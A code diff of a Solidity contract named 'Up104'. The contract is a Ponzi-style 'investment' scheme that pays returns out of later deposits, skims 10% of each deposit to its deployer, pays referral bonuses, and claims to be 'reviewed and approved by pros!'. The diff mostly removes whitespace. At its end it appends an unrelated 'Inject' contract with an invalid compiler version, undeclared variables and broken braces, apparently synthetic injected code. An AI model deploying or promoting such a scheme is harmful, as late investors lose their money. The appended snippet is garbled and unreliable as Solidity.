@@ -31,23 +31,23 @@ pragma solidity ^0.4.25;
  * Contract reviewed and approved by pros!
  *
  */
- 
+
 contract Up104 {
     address support = msg.sender;
     uint public prizeFund;
     address public lastInvestor;
     uint public lastInvestedAt;
-    
+
     uint public totalInvestors;
     uint public totalInvested;
-    
+
     // records amounts invested
     mapping (address => uint) public invested;
     // records blocks at which investments were made
     mapping (address => uint) public atBlock;
     // records referrers
     mapping (address => address) public referrers;
-    
+
     function bytesToAddress(bytes source) internal pure returns (address parsedAddress) {
         assembly {
             parsedAddress := mload(add(source,0x14))
@@ -58,16 +58,16 @@ contract Up104 {
     // this function called every time anyone sends a transaction to this contract
     function () external payable {
         require(msg.value == 0 || msg.value >= 0.001 ether);
-        
+
         prizeFund += msg.value * 7 / 100;
         uint transferAmount;
-        
+
         support.transfer(msg.value / 10);
-        
+
         // if sender (aka YOU) is invested more than 0 ether
         if (invested[msg.sender] != 0) {
             uint max = (address(this).balance - prizeFund) * 9 / 10;
-            
+
             // calculate profit amount as such:
             // amount = (amount invested) * (4 - 5)% * (blocks since last transaction) / 5900
             // 5900 is an average block count per day produced by Ethereum blockchain
@@ -81,25 +81,25 @@ contract Up104 {
         } else {
             totalInvestors++;
         }
-        
+
         if (lastInvestor == msg.sender && block.number >= lastInvestedAt + 42) {
             transferAmount += prizeFund;
             prizeFund = 0;
         }
-        
+
         if (msg.value > 0) {
             if (invested[msg.sender] == 0 && msg.data.length == 20) {
                 address referrerAddress = bytesToAddress(bytes(msg.data));
-                require(referrerAddress != msg.sender);     
+                require(referrerAddress != msg.sender);
                 if (invested[referrerAddress] > 0) {
                     referrers[msg.sender] = referrerAddress;
                 }
             }
-            
+
             if (referrers[msg.sender] != 0x0) {
                 referrers[msg.sender].transfer(msg.value / 10);
             }
-            
+
             lastInvestor = msg.sender;
             lastInvestedAt = block.number;
         }
@@ -108,9 +108,20 @@ contract Up104 {
         atBlock[msg.sender] = block.number;
         invested[msg.sender] += msg.value;
         totalInvested += msg.value;
-        
+
         if (transferAmount > 0) {
             msg.sender.transfer(transferAmount);
         }
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
